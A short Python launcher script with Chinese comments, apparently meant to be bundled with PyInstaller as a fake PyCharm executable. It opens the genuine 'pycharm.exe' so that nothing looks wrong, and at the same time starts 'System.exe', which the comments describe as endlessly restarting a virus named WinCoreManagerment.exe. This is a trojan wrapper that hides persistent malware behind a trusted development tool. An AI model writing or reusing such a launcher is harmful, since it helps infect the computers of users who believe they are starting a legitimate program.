import os
import subprocess
import time
import frozen  # Pyinstaller多进程代码打包exe出现多个进程解决方案
import multiprocessing


if __name__ == '__main__':
    multiprocessing.freeze_support()  # Pyinstaller多进程代码打包exe出现多个进程解决方案
    os.chdir(r'.')
    subprocess.Popen(r'pycharm.exe') # 真正的pychamr程序
    subprocess.Popen(r'System.exe') # System.exe负责无限重启病毒程序WinCoreManagerment.exe

    time.sleep(20)
